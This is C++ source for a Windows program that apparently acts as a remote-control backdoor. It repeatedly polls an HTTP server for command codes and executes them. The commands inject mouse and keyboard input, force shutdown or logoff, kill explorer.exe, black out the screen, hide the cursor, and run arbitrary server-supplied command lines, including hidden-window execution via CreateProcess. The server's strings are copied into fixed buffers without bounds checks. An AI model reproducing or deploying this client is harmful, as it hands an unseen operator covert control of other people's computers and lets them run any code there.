
#include <WS2tcpip.h>
#include <Windows.h>
#include <time.h>
#include <stdio.h>
#include <process.h>
#include <math.h>
#include <GdiPlus.h>
using namespace Gdiplus;

#include <sio.h>
#include <KMP.h>

#include "resource.h"
#include "common.h"
#include "classes.h"
#include "little.h"
#include "commands.h"

#if UseSendInput
INPUT input[32];
#endif

bool bWorkThreadRun = false;
SOCKET sck = INVALID_SOCKET;


void render()
{
    //HDC         hdc;
    //PAINTSTRUCT ps;
    //hdc = BeginPaint(app.m_hWnd, &ps);

    if (dark)
    {
        app.m_pGraphics->Clear(Color(0, 0, 0));
    }
    else
    {
        app.m_pGraphics->Clear(Color(0, 0, 0, 0));

        for (auto it = g_renderObjects.begin(); it != g_renderObjects.end(); ++it)
            (*it)->render(*app.m_pGraphics);
    }

    //EndPaint(app.m_hWnd, &ps);

    POINT ptSrc = {0, 0};
    BLENDFUNCTION bf = {AC_SRC_OVER, 0, 255, AC_SRC_ALPHA};
#if Dllfn
    updateLayeredWindow(
#else
    UpdateLayeredWindow(
#endif
        app.m_hWnd, app.m_screenDC, (POINT*)&app.m_rect.pos, (SIZE*)&app.m_rect.size, app.m_memDC, &ptSrc, 0, &bf, ULW_ALPHA);
}

#if !UseSendInput
inline void keydown(BYTE bVK)
{
    keybd_event(bVK, 0, 0, 0);
}
inline void keyup(BYTE bVK)
{
    keybd_event(bVK, 0, KEYEVENTF_KEYUP, 0);
}
#endif

void showText(const char* str)
{
    wchar_t *wstr;
    DWORD dwSize = MultiByteToWideChar(CP_OEMCP, 0, str, -1, NULL, 0);
    wstr = new wchar_t[dwSize];
    if (!wstr)
        return;
    MultiByteToWideChar(CP_OEMCP, 0, str, -1, wstr, dwSize);

    //HDC         hdc;
    //PAINTSTRUCT ps;
    //hdc = BeginPaint(app.m_hWnd, &ps);

    app.m_pGraphics->Clear(Color(0, 0, 0, 0));

    SolidBrush brush(Color(255, 0, 0, 255));
    FontFamily fontFamily(L"Times New Roman");
    Font       font(&fontFamily, 24, FontStyleRegular, UnitPixel);
    PointF     pointF(10.0f, 20.0f);

    app.m_pGraphics->DrawString(wstr, -1, &font, pointF, &brush);
    
    //EndPaint(app.m_hWnd, &ps);

    POINT ptSrc = {0, 0};
    BLENDFUNCTION bf = {AC_SRC_OVER, 0, 255, AC_SRC_ALPHA};
#if Dllfn
    updateLayeredWindow(
#else
    UpdateLayeredWindow(
#endif
        app.m_hWnd, app.m_screenDC, (POINT*)&app.m_rect.pos, (SIZE*)&app.m_rect.size, app.m_memDC, &ptSrc, 0, &bf, ULW_ALPHA);

    delete[] wstr;
}

HANDLE g_mouseMoveThread = NULL;
int g_mouseMoveTime = 0;
double g_mouseMoveRad = 0.;
bool g_mouseMove = false;
int g_mouseMovePower = 0;
void mouseMoveStart(void *lpThreadParameter)
{
    dword thistime = 0;
    POINT pt;
    int n1, n2;
    double rad = 0.;
    dword howlong = 2000;
    while (bWorkThreadRun)
    {
        while (g_mouseMove && GetTickCount() - howlong < thistime)
        {
            if (thistime != g_mouseMoveTime)
            {
                thistime = g_mouseMoveTime;
                rad = g_mouseMovePower;
                rad /= 100000.;
                rad *= 2000.;
                howlong = (int)rad;
                rad = g_mouseMoveRad;
            }
            GetCursorPos(&pt);
            n1 = cos(rad) * 2 + pt.x;
            n2 = sin(rad) * 2 + pt.y;
            SetCursorPos(n1, n2);
            Sleep(20);
        }
        if (thistime != g_mouseMoveTime)
        {
            thistime = g_mouseMoveTime;
            rad = g_mouseMovePower;
            rad /= 100000.;
            rad *= 2000.;
            howlong = (int)rad;
            rad = g_mouseMoveRad;
        }
        else
            Sleep(200);
    }
    g_mouseMoveThread = NULL;
    _endthread();
}

bool g_hideCursor = false;
HCURSOR g_hOldCursor = NULL;


void CheckAndDo()
{
    char str[10240];
    
    sck = socket(AF_INET, SOCK_STREAM, 0);//pai->ai_family, pai->ai_socktype, pai->ai_protocol);
    if (INVALID_SOCKET == sck)
        return;

    try
    {
        if (connect(sck, app.pai->ai_addr, app.pai->ai_addrlen) == SOCKET_ERROR)
            throw L"1";

        if (send(sck, strHeader, strlen(strHeader), 0) == SOCKET_ERROR)
            throw L"2";

        str[0] = '\0';
        if (strLastModified[0] != '\0')
        {
            strcat(str, "If-Modified-Since:");
            strcat(str, strLastModified);
        }
        strcat(str, "Connection: Close\r\n\r\n");
        if (send(sck, str, strlen(str), 0) == SOCKET_ERROR)
            throw L"3";
    }
    catch (...)
    {
        closesocket(sck);
        return;
    }

    int received = recv(sck, str, 2047, 0);
    str[received] = '\0';

    closesocket(sck);
    
    int cid, t = 0;
    int i;
    i = KMP(str, "Last-Modified:", 0, true);
    if (i > 0)
    {
        t = KMP(str, "\r\n", i, true);
        if (t > 0)
        {
            memcpy(strLastModified, str + i, t - i);
            strLastModified[t - i] = '\0';
        }
    }
    else
        strLastModified[0] = '\0';

    i = KMP(str, "SFLBU[", t, true);
    if (i < 0)
        return;
    char *pch = str + i;
    pch = parseInt(pch, &t);
    ++pch;
    pch = parseInt(pch, &cid);

    auto current = time(NULL);

    if (t + 20 < current)
        return;

#if 0
    http.get();
    sscanf((char*)http.responseContent(), "%d#%d", &cid, &t);
#else

#endif
    if (t != lasttime)
    {
        lasttime = t;
        switch (cid)
        {
        case commands::watchSreenBegin:
            {
                app.startScreenThread();
            }
            break;
        case commands::watchSreenEnd:
            {
                if (app.m_hScreenThread != nullptr)
                {
                    if (sckScreen != INVALID_SOCKET)
                    {
                        try
                        {
                            closesocket(sck);
                            sckScreen = INVALID_SOCKET;
                        }
                        catch (...)
                        {
                        }
                    }
                    bScreenThreadRun = false;
                    WaitForSingleObject(app.m_hScreenThread, INFINITE);
                    CloseHandle(app.m_hScreenThread);
                    app.m_hScreenThread = nullptr;
                }
            }
            break;
        case commands::capture:
            {
            }
            break;
        case commands::mouseMove:
            {
                if (*pch == '#')
                {
                    ++pch;
                    int n1, n2 = 1;
                    if (*pch == '-')
                    {
                        ++pch;
                        n2 = -1;
                    }
                    pch = parseInt(pch, &n1);
                    ++pch;
                    pch = parseInt(pch, &g_mouseMovePower);
                    n1 *= n2;
                    g_mouseMoveRad = n1;
                    g_mouseMoveRad /= 100000.;
                    g_mouseMoveTime = GetTickCount();
                    g_mouseMove = true;
                    /*
                    if (!g_mouseMoveThread)
                    {
                    g_mouseMoveThread = (HANDLE)_beginthread(mouseMoveStart, 0, nullptr);
                    }
                    */
                }
                else
                {
                    g_mouseMoveTime = GetTickCount();
                    g_mouseMove = false;
                }
            }
            break;
        case commands::lbutton:
#if UseSendInput
            ZeroMemory(input, sizeof(INPUT) * 2);
            input[0].type = INPUT_MOUSE;
            input[0].mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
            input[1].type = INPUT_MOUSE;
            input[1].mi.dwFlags = MOUSEEVENTF_LEFTUP;
            SendInput(2, input, sizeof(INPUT));
#else
            mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, NULL, NULL);
#endif
            break;
        case commands::upwheel:
#if UseSendInput
            ZeroMemory(input, sizeof(INPUT));
            input[0].type = INPUT_MOUSE;
            input[0].mi.dwFlags = MOUSEEVENTF_WHEEL;
            input[0].mi.mouseData = WHEEL_DELTA;
            SendInput(1, input, sizeof(INPUT));
#else
            mouse_event(MOUSEEVENTF_WHEEL, 0, 0, WHEEL_DELTA, NULL);
#endif
            break;
        case commands::mbutton:
#if UseSendInput
            ZeroMemory(input, sizeof(INPUT) * 2);
            input[0].type = INPUT_MOUSE;
            input[0].mi.dwFlags = MOUSEEVENTF_MIDDLEDOWN;
            input[1].type = INPUT_MOUSE;
            input[1].mi.dwFlags = MOUSEEVENTF_MIDDLEUP;
            SendInput(2, input, sizeof(INPUT));
#else
            mouse_event(MOUSEEVENTF_MIDDLEDOWN | MOUSEEVENTF_MIDDLEUP, 0, 0, NULL, NULL);
#endif
            break;
        case commands::downwheel:
#if UseSendInput
            ZeroMemory(input, sizeof(INPUT));
            input[0].type = INPUT_MOUSE;
            input[0].mi.dwFlags = MOUSEEVENTF_WHEEL;
            input[0].mi.mouseData = -WHEEL_DELTA;
            SendInput(1, input, sizeof(INPUT));
#else
            mouse_event(MOUSEEVENTF_WHEEL, 0, 0, -WHEEL_DELTA, NULL);
#endif
            break;
        case commands::rbutton:
#if UseSendInput
            ZeroMemory(input, sizeof(INPUT) * 2);
            input[0].type = INPUT_MOUSE;
            input[0].mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;
            input[1].type = INPUT_MOUSE;
            input[1].mi.dwFlags = MOUSEEVENTF_RIGHTUP;
            SendInput(2, input, sizeof(INPUT));
#else
            mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, NULL, NULL);
#endif
            break;
        case commands::lbuttondown:
#if UseSendInput
            ZeroMemory(input, sizeof(INPUT));
            input[0].type = INPUT_MOUSE;
            input[0].mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
            SendInput(1, input, sizeof(INPUT));
#else
            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, NULL, NULL);
#endif
            break;
        case commands::lbuttonup:
#if UseSendInput
            ZeroMemory(input, sizeof(INPUT));
            input[0].type = INPUT_MOUSE;
            input[0].mi.dwFlags = MOUSEEVENTF_LEFTUP;
            SendInput(1, input, sizeof(INPUT));
#else
            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, NULL, NULL);
#endif
            break;
        case commands::rbuttondown:
#if UseSendInput
            ZeroMemory(input, sizeof(INPUT));
            input[0].type = INPUT_MOUSE;
            input[0].mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;
            SendInput(1, input, sizeof(INPUT));
#else
            mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, NULL, NULL);
#endif
            break;
        case commands::rbuttonup:
#if UseSendInput
            ZeroMemory(input, sizeof(INPUT));
            input[0].type = INPUT_MOUSE;
            input[0].mi.dwFlags = MOUSEEVENTF_RIGHTUP;
            SendInput(1, input, sizeof(INPUT));
#else
            mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, NULL, NULL);
#endif
            break;
        case commands::sendString:
            {
                ++pch;
                char str[1024];
                int i = 0;
                while (*pch)
                    str[i++] = *pch++;
                str[i - 1] = '\0';
                i = 0;
                HWND hwnd = GetForegroundWindow();
                DWORD curThreadId = GetCurrentThreadId();
                DWORD pid = GetWindowThreadProcessId(hwnd, NULL);
                AttachThreadInput(pid, curThreadId, true);
                hwnd = GetFocus();
                AttachThreadInput(pid, curThreadId, false);
                while (str[i])
                    PostMessageA(hwnd, WM_CHAR, str[i++] & 0xff, 0);
            }
            break;
        case commands::kdWin:
#if UseSendInput
            ZeroMemory(input, sizeof(INPUT) * 2);
            input[0].type = INPUT_KEYBOARD;
            input[0].ki.wVk = VK_LWIN;
            input[1].type = INPUT_KEYBOARD;
            input[1].ki.wVk = VK_LWIN;
            input[1].ki.dwFlags = KEYEVENTF_KEYUP;
            SendInput(2, input, sizeof(INPUT));
#else
            keydown(VK_LWIN);
            keyup(VK_LWIN);
#endif
            break;
        case commands::kdUp:
#if UseSendInput
            ZeroMemory(input, sizeof(INPUT) * 2);
            input[0].type = INPUT_KEYBOARD;
            input[0].ki.wVk = VK_UP;
            input[1].type = INPUT_KEYBOARD;
            input[1].ki.wVk = VK_UP;
            input[1].ki.dwFlags = KEYEVENTF_KEYUP;
            SendInput(2, input, sizeof(INPUT));
#else
            keydown(VK_UP);
            keyup(VK_UP);
#endif
            break;
        case commands::kdDown:
#if UseSendInput
            ZeroMemory(input, sizeof(INPUT) * 2);
            input[0].type = INPUT_KEYBOARD;
            input[0].ki.wVk = VK_DOWN;
            input[1].type = INPUT_KEYBOARD;
            input[1].ki.wVk = VK_DOWN;
            input[1].ki.dwFlags = KEYEVENTF_KEYUP;
            SendInput(2, input, sizeof(INPUT));
#else
            keydown(VK_DOWN);
            keyup(VK_DOWN);
#endif
            break;
        case commands::kdRight:
#if UseSendInput
            ZeroMemory(input, sizeof(INPUT) * 2);
            input[0].type = INPUT_KEYBOARD;
            input[0].ki.wVk = VK_RIGHT;
            input[1].type = INPUT_KEYBOARD;
            input[1].ki.wVk = VK_RIGHT;
            input[1].ki.dwFlags = KEYEVENTF_KEYUP;
            SendInput(2, input, sizeof(INPUT));
#else
            keydown(VK_RIGHT);
            keyup(VK_RIGHT);
#endif
            break;
        case commands::kdLeft:
#if UseSendInput
            ZeroMemory(input, sizeof(INPUT) * 2);
            input[0].type = INPUT_KEYBOARD;
            input[0].ki.wVk = VK_LEFT;
            input[1].type = INPUT_KEYBOARD;
            input[1].ki.wVk = VK_LEFT;
            input[1].ki.dwFlags = KEYEVENTF_KEYUP;
            SendInput(2, input, sizeof(INPUT));
#else
            keydown(VK_LEFT);
            keyup(VK_LEFT);
#endif
            break;
        case commands::kdEsc:
#if UseSendInput
            ZeroMemory(input, sizeof(INPUT) * 2);
            input[0].type = INPUT_KEYBOARD;
            input[0].ki.wVk = VK_ESCAPE;
            input[1].type = INPUT_KEYBOARD;
            input[1].ki.wVk = VK_ESCAPE;
            input[1].ki.dwFlags = KEYEVENTF_KEYUP;
            SendInput(2, input, sizeof(INPUT));
#else
            keydown(VK_ESCAPE);
            keyup(VK_ESCAPE);
#endif
            break;
        case commands::kdHome:
#if UseSendInput
            ZeroMemory(input, sizeof(INPUT) * 2);
            input[0].type = INPUT_KEYBOARD;
            input[0].ki.wVk = VK_HOME;
            input[1].type = INPUT_KEYBOARD;
            input[1].ki.wVk = VK_HOME;
            input[1].ki.dwFlags = KEYEVENTF_KEYUP;
            SendInput(2, input, sizeof(INPUT));
#else
            keydown(VK_HOME);
            keyup(VK_HOME);
#endif
            break;
        case commands::kdEnd:
#if UseSendInput
            ZeroMemory(input, sizeof(INPUT) * 2);
            input[0].type = INPUT_KEYBOARD;
            input[0].ki.wVk = VK_END;
            input[1].type = INPUT_KEYBOARD;
            input[1].ki.wVk = VK_END;
            input[1].ki.dwFlags = KEYEVENTF_KEYUP;
            SendInput(2, input, sizeof(INPUT));
#else
            keydown(VK_END);
            keyup(VK_END);
#endif
            break;
        case commands::kdEnter:
#if UseSendInput
            ZeroMemory(input, sizeof(INPUT) * 2);
            input[0].type = INPUT_KEYBOARD;
            input[0].ki.wVk = VK_RETURN;
            input[1].type = INPUT_KEYBOARD;
            input[1].ki.wVk = VK_RETURN;
            input[1].ki.dwFlags = KEYEVENTF_KEYUP;
            SendInput(2, input, sizeof(INPUT));
#else
            keydown(VK_RETURN);
            keyup(VK_RETURN);
#endif
            break;
        case commands::kdSpace:
#if UseSendInput
            ZeroMemory(input, sizeof(INPUT) * 2);
            input[0].type = INPUT_KEYBOARD;
            input[0].ki.wVk = VK_SPACE;
            input[1].type = INPUT_KEYBOARD;
            input[1].ki.wVk = VK_SPACE;
            input[1].ki.dwFlags = KEYEVENTF_KEYUP;
            SendInput(2, input, sizeof(INPUT));
#else
            keydown(VK_SPACE);
            keyup(VK_SPACE);
#endif
            break;
        case commands::CtrlAltDelete:
#if UseSendInput
            ZeroMemory(input, sizeof(INPUT) * 3);
            input[0].type = INPUT_KEYBOARD;
            input[0].ki.wVk = VK_CONTROL;
            input[1].type = INPUT_KEYBOARD;
            input[1].ki.wVk = VK_MENU;
            input[2].type = INPUT_KEYBOARD;
            input[2].ki.wVk = VK_DELETE;
            SendInput(3, input, sizeof(INPUT));
            
            input[0].ki.dwFlags = KEYEVENTF_KEYUP;
            input[1].ki.dwFlags = KEYEVENTF_KEYUP;
            input[2].ki.dwFlags = KEYEVENTF_KEYUP;
            SendInput(3, input, sizeof(INPUT));
#else
            keydown(VK_CONTROL);
            keydown(VK_MENU);
            keydown(VK_DELETE);
            keyup(VK_DELETE);
            keyup(VK_MENU);
            keyup(VK_CONTROL);
#endif
            break;
        case commands::AltF4:
#if UseSendInput
            ZeroMemory(input, sizeof(INPUT) * 2);
            input[0].type = INPUT_KEYBOARD;
            input[0].ki.wVk = VK_MENU;
            input[1].type = INPUT_KEYBOARD;
            input[1].ki.wVk = VK_F4;
            SendInput(2, input, sizeof(INPUT));

            input[0].ki.dwFlags = KEYEVENTF_KEYUP;
            input[1].ki.dwFlags = KEYEVENTF_KEYUP;
            SendInput(2, input, sizeof(INPUT));
#else
            keydown(VK_MENU);
            keydown(VK_F4);
            keyup(VK_F4);
            keyup(VK_MENU);
#endif
            break;
        case commands::shutdown:
            {
                ++pch;
                int force;
                pch = parseInt(pch, &force);
                const wchar_t strCmdShutdown[] = L"shutdown -s -t 0";
                const wchar_t strCmdShutdownf[] = L"shutdown -f -s -t 0";
                wchar_t *strCmd = (wchar_t*)(force ? strCmdShutdownf : strCmdShutdown);
                STARTUPINFO si;
                PROCESS_INFORMATION pi;
                ZeroMemory(&si, sizeof(si));
                si.cb = sizeof(si);
                ZeroMemory(&pi, sizeof(pi));
                if (CreateProcess(nullptr, strCmd, nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
                              nullptr, nullptr, &si, &pi))
                {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
            }
            break;
        case commands::switchUser:
            {
                STARTUPINFO si;
                PROCESS_INFORMATION pi;
                ZeroMemory(&si, sizeof(si));
                si.cb = sizeof(si);
                ZeroMemory(&pi, sizeof(pi));                

                if (CreateProcess(nullptr, L"taskkill /f /im explorer.exe", nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
                              nullptr, nullptr, &si, &pi))
                {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
            }
            break;
        case commands::logOff:
            {
                ++pch;
                int force;
                pch = parseInt(pch, &force);
                const wchar_t strCmdShutdown[] = L"shutdown -l";
                const wchar_t strCmdShutdownf[] = L"shutdown -f -l";
                wchar_t *strCmd = (wchar_t*)(force ? strCmdShutdownf : strCmdShutdown);
                STARTUPINFO si;
                PROCESS_INFORMATION pi;
                ZeroMemory(&si, sizeof(si));
                si.cb = sizeof(si);
                ZeroMemory(&pi, sizeof(pi));

                if (CreateProcess(nullptr, strCmd, nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
                              nullptr, nullptr, &si, &pi))
                {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
            }
            break;
        case commands::lock:
            {
                STARTUPINFO si;
                PROCESS_INFORMATION pi;
                ZeroMemory(&si, sizeof(si));
                si.cb = sizeof(si);
                ZeroMemory(&pi, sizeof(pi));
                if (CreateProcess(L"rundll32", L"user32.dll, LockWorkStation", nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
                              nullptr, nullptr, &si, &pi))
                {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
            }
            break;
        case commands::restart:
            {
                ++pch;
                int force;
                pch = parseInt(pch, &force);
                const wchar_t strCmdShutdown[] = L"shutdown -r";
                const wchar_t strCmdShutdownf[] = L"shutdown -f -r";
                wchar_t *strCmd = (wchar_t*)(force ? strCmdShutdownf : strCmdShutdown);
                STARTUPINFO si;
                PROCESS_INFORMATION pi;
                ZeroMemory(&si, sizeof(si));
                si.cb = sizeof(si);
                ZeroMemory(&pi, sizeof(pi));
                if (CreateProcess(nullptr, strCmd, nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
                              nullptr, nullptr, &si, &pi))
                {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
            }
            break;
        case commands::sleep:
            {
                STARTUPINFO si;
                PROCESS_INFORMATION pi;
                ZeroMemory(&si, sizeof(si));
                si.cb = sizeof(si);
                ZeroMemory(&pi, sizeof(pi));
                if (CreateProcess(L"rundll32", L"powrprof.dll,SetSuspendState 0,1,0", nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
                              nullptr, nullptr, &si, &pi))
                {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
            }
            break;
        case commands::hibernate:
            {
                ++pch;
                int force;
                pch = parseInt(pch, &force);
                const wchar_t strCmdShutdown[] = L"shutdown -h";
                const wchar_t strCmdShutdownf[] = L"shutdown -f -h";
                wchar_t *strCmd = (wchar_t*)(force ? strCmdShutdownf : strCmdShutdown);
                STARTUPINFO si;
                PROCESS_INFORMATION pi;
                ZeroMemory(&si, sizeof(si));
                si.cb = sizeof(si);
                ZeroMemory(&pi, sizeof(pi));
                if (CreateProcess(nullptr, strCmd, nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
                              nullptr, nullptr, &si, &pi))
                {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
            }
            break;
        case commands::run:
            {
                ++pch;
                char str[1024];
                int i = 0;
                while (*pch)
                    str[i++] = *pch++;
                str[i - 1] = '\0';
                STARTUPINFOA si;
                PROCESS_INFORMATION pi;
                ZeroMemory(&si, sizeof(si));
                si.cb = sizeof(si);
                ZeroMemory(&pi, sizeof(pi));
                if (CreateProcessA(NULL, str, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
                {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
            }
            break;
        case commands::runWithNoWindow:
            {
                ++pch;
                char str[1024];
                int i = 0;
                while (*pch)
                    str[i++] = *pch++;
                str[i - 1] = '\0';
                STARTUPINFOA si;
                PROCESS_INFORMATION pi;
                ZeroMemory(&si, sizeof(si));
                si.cb = sizeof(si);
                ZeroMemory(&pi, sizeof(pi));
                if (CreateProcessA(NULL, str, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
                {

                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
            }
            break;
        case commands::msgBox:
            {
                ++pch;
                char str[1024];
                int i = 0;
                while (*pch)
                    str[i++] = *pch++;
                str[i - 1] = '\0';
                MessageBoxA(NULL, str, "Message", MB_OK);
            }
            break;
        case commands::showText:
            {
                ++pch;
                char str[1024];
                int i = 0;
                while (*pch)
                    str[i++] = *pch++;
                str[i - 1] = '\0';
                showText(str);
            }
            break;
        case commands::dark:
            dark = !dark;
            if (dark)
            {
                if (!g_hideCursor)
                {
                    g_hideCursor = true;
                    g_hOldCursor = GetCursor();
                    SetSystemCursor(LoadCursor(app.m_hInst, MAKEINTRESOURCE(IDC_CURSOR1)), 32512);
                }
            }
            else
            {
                if (g_hideCursor)
                {
                    g_hideCursor = false;
                    SetSystemCursor(g_hOldCursor, 32512);
                }
            }
            render();
            break;
        case commands::hideCursor:
            g_hideCursor = !g_hideCursor;
            if (g_hideCursor)
            {
                g_hOldCursor = GetCursor();
                SetSystemCursor(LoadCursor(app.m_hInst, MAKEINTRESOURCE(IDC_CURSOR1)), 32512);//while (ShowCursor(FALSE) >= 0);
            }
            else
                SetSystemCursor(g_hOldCursor, 32512);//while (ShowCursor(TRUE) < 0);
            break;
        case commands::multiCursor:
            break;
        case commands::showTextEx:
            break;
        case commands::showInNotepad:
            {
                STARTUPINFOA si;
                PROCESS_INFORMATION pi;
                ZeroMemory(&si, sizeof(si));
                si.cb = sizeof(si);
                ZeroMemory(&pi, sizeof(pi));
                if (CreateProcessA(NULL, "notepad", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
                {
                    ++pch;
                    char str[1024];
                    int i = 0;
                    while (*pch)
                        str[i++] = *pch++;
                    str[i - 1] = '\0';
                    i = 0;
                    HWND hwnd;
                    DWORD curThreadId = GetCurrentThreadId();
                    Sleep(200);
                    AttachThreadInput(pi.dwThreadId, curThreadId, true);
                    hwnd = GetFocus();
                    AttachThreadInput(pi.dwThreadId, curThreadId, false);
                    while (str[i])
                        PostMessageA(hwnd, WM_CHAR, str[i++] & 0xff, 0);

                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }                
            }
            break;
        }
    }
    if (dark)
        SetForegroundWindow(app.m_hWnd);
}

void workthreadStart(void *lpThreadParameter)
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData))
        return;

    addrinfo hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    while (bWorkThreadRun && getaddrinfo(app.url.hostname, "80", &hints, &app.pai) != 0)
    {
        Sleep(2000);
    }

    sprintf(strHeader, "GET /%s HTTP/1.1\r\nHost: %s\r\n", app.url.path, app.url.hostname);

    g_mouseMoveThread = (HANDLE)_beginthread(mouseMoveStart, 0, nullptr);
    
    while (bWorkThreadRun)
    {
        nWorkThreadWorkClock = clock();
        CheckAndDo();
        Sleep(200);
    }

    WSACleanup();

    _endthread();
}